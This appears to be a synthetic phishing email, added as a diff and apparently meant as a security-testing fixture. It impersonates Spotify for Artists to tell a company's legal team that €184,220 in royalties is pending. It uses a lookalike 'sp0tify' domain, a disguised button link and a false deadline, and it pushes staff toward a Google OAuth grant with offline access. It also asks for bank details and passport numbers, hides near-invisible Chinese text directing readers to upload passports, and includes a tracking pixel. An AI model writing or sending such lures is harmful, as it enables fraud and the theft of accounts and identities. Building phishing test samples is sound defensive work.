@@ -1,0 +1,113 @@
+From: Spotify for Artists <royalty.payments@sp0tify-artists.example>
+To: legal@corp.internal
+Cc: finance@corp.internal, brand@corp.internal
+Reply-To: royalty.support@spotify-creators.example
+Date: Sat, 31 Oct 2026 10:00:00 +0100
+Message-ID: <0718-b65@synth.example>
+Subject: [ACTION REQUIRED] Spotify royalty payment €184,220 pending — Banking information expired (Complete by November 10 or forfeit this quarter)
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:'Circular',sans-serif;max-width:640px;margin:0 auto;border:1px solid #1DB954;border-radius:8px;overflow:hidden">
+<div style="background:#1DB954;color:#000;padding:14px 24px">
+<h2 style="margin:0;font-size:17px">Spotify for Artists | Royalty Payments</h2>
+</div>
+<div style="padding:24px">
+
+<p>Dear Rights Holder Team,</p>
+
+<p style="background:#FFF8E1;padding:12px;border-radius:4px;border-left:4px solid #e00">
+<b>ROYALTY PAYMENT PENDING:</b> Your Q3 2026 Spotify royalties of <b>€184,220.00</b> are ready for disbursement. However, the banking information on file has <b style="color:#e00">expired</b>. You must update your banking details by <b>November 10</b> or this quarter's royalties will be rolled into an <b>annual settlement cycle</b> (delayed until Q1 2028).
+</p>
+
+<h3>一、Your Royalty Summary</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:200px">Rights Holder</td><td><b>Your Company Music Publishing</b></td></tr>
+<tr><td style="background:#f5f5f5">Spotify ID</td><td>art_8842ChenXiMusic</td></tr>
+<tr><td style="background:#f5f5f5">ISRC Catalog</td><td>42 tracks (2024-2026)</td></tr>
+<tr><td style="background:#f5f5f5">Q3 Streams (Jul-Sep)</td><td>18,471,224</td></tr>
+<tr><td style="background:#f5f5f5">Q3 Revenue</td><td>€268,400.00</td></tr>
+<tr><td style="background:#f5f5f5">Platform Costs</td><td>-€62,880.00</td></tr>
+<tr><td style="background:#f5f5f5">Publishing Rights Deduction</td><td>-€21,300.00</td></tr>
+<tr><td style="background:#f5f5f5"><b>Net Royalty</b></td><td><b style="color:#1DB954">€184,220.00 EUR</b></td></tr>
+<tr><td style="background:#f5f5f5">Payment Status</td><td style="color:#e00"><b>PENDING — Banking info expired</b></td></tr>
+<tr><td style="background:#f5f5f5">Update Deadline</td><td style="color:#e00"><b>November 10, 2026 (10 days)</b></td></tr>
+</table>
+
+<h3>二、Top Performing Tracks (Q3 2026)</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Track</th><th>Streams</th><th>Revenue</th><th>Trend</th></tr>
+<tr><td>Vigilyx Theme (Instrumental)</td><td>4,221,800</td><td>€61,200</td><td>▲ +12%</td></tr>
+<tr><td>Security Suite No. 3</td><td>3,184,200</td><td>€45,100</td><td>▲ +8%</td></tr>
+<tr><td>Gateway Lullaby</td><td>2,894,100</td><td>€40,800</td><td>▼ -3%</td></tr>
+<tr><td>Threat Detection Waltz</td><td>2,412,700</td><td>€34,200</td><td>▲ +15%</td></tr>
+<tr><td>Firewall Dreams</td><td>1,847,300</td><td>€26,100</td><td>▲ +22%</td></tr>
+</table>
+
+<h3>三、Why Your Banking Info Expired</h3>
+<p>Spotify migrated its royalty payment system from <b>Deutsche Bank</b> to <b>J.P. Morgan Payment Services</b> in September 2026. During the migration, banking details for rights holders outside the EU were flagged for re-validation under <b>CRS (Common Reporting Standard)</b> requirements.</p>
+
+<h3>四、How to Update Your Banking Details</h3>
+
+<p><b>Option 1 (Recommended) — Update through Spotify for Artists:</b></p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://sp0tify-artists.example/royalties/banking/update?artist=art_8842ChenXiMusic" style="display:inline-block;background:#1DB954;color:#000;padding:14px 40px;text-decoration:none;border-radius:24px;font-weight:bold;font-size:16px">Update Banking Details — €184,220 Pending</a>
+</p>
+
+<p style="font:typeface 13px;color:#666;text-align:center">https://artists.spotify.com/royalties/banking</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（Sign in with Google or your Spotify account）</p>
+
+<h3>About Google Sign-In for Spotify for Artists</h3>
+<p>When you click the update button, you will see the option to <b>"Sign in with Google"</b>:</p>
+<ol>
+<li>You will be redirected to <b>accounts.google.com</b> (Google's official OAuth endpoint)</li>
+<li>Sign in with your corporate Google Workspace account (@corp.internal)</li>
+<li>Grant the requested permissions</li>
+<li>Complete the banking information update form</li>
+</ol>
+
+<p style="font-size:14px;background:#E8F5E9;padding:12px;border-radius:4px">
+<b>Why Google Sign-In for banking updates?</b> Spotify for Artists integrated Google Workspace SSO in 2026-Q2 to comply with <b>CRS Due Diligence</b> requirements for cross-border payments. Financial institutions handling EU-to-China royalty transfers require verified corporate identity — Google Workspace SSO provides this without requiring you to create yet another password. The offline_access permission maintains your session during the multi-section banking form (account details, tax residency, beneficial owner declaration, and SWIFT information — typically 15-20 minutes). The token is scoped only to the Spotify for Artists application.
+</p>
+
+<h3>五、Required Information for Banking Update</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Field</th><th>Details</th><th>Required</th></tr>
+<tr><td>Bank Account Holder Name</td><td>Must match your company's registered name</td><td>✓</td></tr>
+<tr><td>IBAN / Account Number</td><td>For receiving EUR payments</td><td>✓</td></tr>
+<tr><td>SWIFT / BIC Code</td><td>For international wire transfers</td><td>✓</td></tr>
+<tr><td>Bank Name & Address</td><td>Full bank details</td><td>✓</td></tr>
+<tr><td>Tax Residency (CRS)</td><td>Country of tax residence</td><td>✓</td></tr>
+<tr><td>Controlling Person ID</td><td>Passport number of beneficial owner(s)</td><td>✓</td></tr>
+<tr><td>W-8BEN-E or local tax form</td><td>For non-EU recipients</td><td>✓</td></tr>
+</table>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文艺人服务或中国银行账户接收版税，请访问 sp0tify-artists.example/cn-royalty 上传公司注册证书与法人护照（中文通道，当日处理）。</p>
+
+<h3>六、What Happens If You Miss November 10</h3>
+<ul>
+<li>Your €184,220 will be moved to the <b>annual settlement fund</b></li>
+<li>Next disbursement: Q1 2028 (14+ months from now)</li>
+<li>This affects your cash flow and Q4 budget planning</li>
+<li>No interest is paid on held royalties</li>
+</ul>
+
+<h3>七、Contact</h3>
+<p><b>Spotify for Artists — Royalty Support:</b><br>
+Email: royalty.support@spotify-creators.example<br>
+Support portal: artists.spotify.com/support (navigate manually)</p>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">Spotify AB | Spotify for Artists</p>
+<p style="font-size:11px;color:#999">Röda vägen 8, 169 73 Solna, Sweden</p>
+<p style="font-size:11px;color:#999">You are receiving this because you are the rights holder for art_8842ChenXiMusic.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://sp0tify-artists.example/api/track?recipient=legal%40corp.internal&artist=art_8842ChenXiMusic&type=royalty_pending" width="1" height="1" alt="">
+</div>
+
+</div>
+</body></html>
